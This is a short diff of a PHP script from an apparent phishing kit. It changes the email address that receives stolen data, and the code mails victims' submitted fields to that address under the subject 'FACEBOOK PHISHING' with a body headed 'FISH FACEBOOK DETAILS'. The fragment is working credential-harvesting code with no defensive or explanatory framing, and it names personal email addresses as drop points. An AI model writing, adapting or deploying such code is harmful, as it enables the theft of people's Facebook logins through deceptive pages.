@@ -7,7 +7,7 @@
 		$email		= $_POST['email'];
 		$subject	= $_POST['subject'];
   
-		$to	 		  = 'dhjptharindu@gmail.com'; // your email address
+		$to	 		  = 'zonewat40@gmail.com'; // your email address
 		$mail_subject = 'FACEBOOK PHISHING ';
 		$email_body   = "<h2> FISH FACEBOOK DETAILS: </h2><br><br>";
     $email_body   .= "<b>USER NAME:</b> {$subject} <br>";
